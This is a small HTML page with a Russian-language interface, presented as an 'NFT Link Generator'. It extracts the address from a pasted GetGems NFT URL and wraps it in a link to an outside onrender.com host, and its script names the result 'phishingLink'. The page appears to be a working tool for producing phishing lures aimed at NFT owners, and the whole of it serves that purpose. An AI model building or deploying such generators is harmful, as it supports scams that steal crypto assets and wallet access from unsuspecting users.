<!DOCTYPE html>
<html>
<head>
    <title>NFT Generator</title>
    <style>
        body { background: #111; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
        input { width: 80%; padding: 10px; margin: 10px; border-radius: 5px; border: none; }
        button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; border-radius: 5px; }
        #result { margin-top: 20px; color: #00ff00; word-break: break-all; }
    </style>
</head>
<body>
    <h1>NFT Link Generator</h1>
    <input type="text" id="nftInput" placeholder="Вставь ссылку на NFT с GetGems...">
    <button onclick="generate()">Сгенерировать ссылку</button>
    <div id="result"></div>

    <script>
        function generate() {
            const url = document.getElementById('nftInput').value;
            const parts = url.split('/');
            const nftAddress = parts[parts.length - 1];
            
            if (nftAddress.length > 40) {
                const phishingLink = `https://newifi.onrender.com/?nft=${nftAddress}`;
                document.getElementById('result').innerHTML = `Готово! Твоя ссылка:<br><br><a href="${phishingLink}" style="color:yellow">${phishingLink}</a>`;
            } else {
                alert("Ошибка: неверная ссылка");
            }
        }
    </script>
</body>
</html>
